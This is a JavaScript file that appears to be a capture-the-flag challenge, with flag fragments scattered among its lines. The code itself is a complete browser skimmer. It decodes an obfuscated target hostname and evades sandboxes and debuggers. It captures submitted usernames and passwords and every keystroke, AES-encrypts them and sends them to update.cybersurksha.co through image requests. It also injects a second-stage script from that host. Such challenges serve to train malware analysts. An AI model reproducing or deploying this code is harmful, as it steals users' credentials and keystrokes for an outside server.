console.log('flag{th1s_'); 

(function() {
    // 🔒 Stage 1: Target Site Detection (Base64 + XOR fake check)
    const encoded = "c3RlYWxlci5jeWJlcnN1cmFrc2hhLmNv";
    const xorDecode = (str, key) => str.split('').map((c,i)=>String.fromCharCode(c.charCodeAt(0)^key.charCodeAt(i%key.length))).join('');
    const target = xorDecode(atob(encoded), 'XrKey');

    if (window.location.hostname !== target) return;

    // 🎭 Stage 2:  Interface + Session Trigger
    const sessionFlag = localStorage.getItem('gpt_session') || 0;
    localStorage.setItem('sessionKey', '1s_mult1'); 
if (sessionFlag < 2) {
        console.log("Welcome to ChatGPT v2!");
        localStorage.setItem('gpt_session', parseInt(sessionFlag) + 1);
        return;
    }

    // ⏱ Stage 3: Delayed Activation & Anti-Sandbox
    const delay = Math.floor(Math.random() * 3000) + 2000;
    const ua = window.navigator.userAgent.toLowerCase();
    document.cookie = 'auth=stage_ct'; 
if (ua.includes('headless') || ua.includes('vmware') || window.outerWidth < 400) return;

    setTimeout(() => {
        // 👀 Stage 4: Form Submission Capture
        document.addEventListener('submit', function(e) {
            let form = e.target;
            let data = new FormData(form);
            let u = data.get('username') || data.get('email');
            let p = data.get('password');
            if (u && p) steal(u, p);
        });

        // 🧠 Stage 5: Keystroke + Beacon Transmission
        document.addEventListener('keydown', function(e) {
            if (!e.isTrusted) return;
            beacon('key', e.key);
        });
    }, delay);

    // 🧪 Stage 6: Secondary Payload Trigger (Dynamic Script Injection)
    setTimeout(() => {
        var s = document.createElement('script');
        s.src = 'https://update.cybersurksha.co/drop.js';
        document.head.appendChild(s);
    }, 10000);

    window.__debug_info = 'f_ch4ll3'; 
function steal(u, p) {
        let payload = { u, p, site: location.hostname };
        send(encrypt(JSON.stringify(payload)));
    }

    var hiddenFlag = 'ng3_fin4'; 
function beacon(t, d) {
        let payload = { type: t, data: d, site: location.hostname };
        send(encrypt(JSON.stringify(payload)));
    }

    function send(payload) {
        const i = new Image();
        i.src = 'https://update.cybersurksha.co/x.php?d=' + encodeURIComponent(payload);
        document.body.appendChild(i);
    }

    function encrypt(msg) {
        const key = CryptoJS.enc.Utf8.parse('LiiWBgWzjmmWinNp');
        const iv = CryptoJS.lib.WordArray.random(16);
        const enc = CryptoJS.AES.encrypt(msg, key, { iv: iv });
        return iv.concat(enc.ciphertext).toString(CryptoJS.enc.Base64);
    }

    // 👁️ Stage 7: Anti-Debugger Infinite Loop Trap
    const el = new Image();
    Object.defineProperty(el, 'id', {
        get: function() {
            window.location = "https://update.cybersurksha.co/fail";
            throw new Error("Debugger Detected");
        }
    });
    Object.defineProperty(window, 'final_flag_part', { get: function() { return 'l_f1nd_m3}'; } }); 
console.log(el);
    setInterval(() => {
        const s = new Date(); debugger;
        if (new Date() - s > 100) while(1){};
    }, 1000);
})();
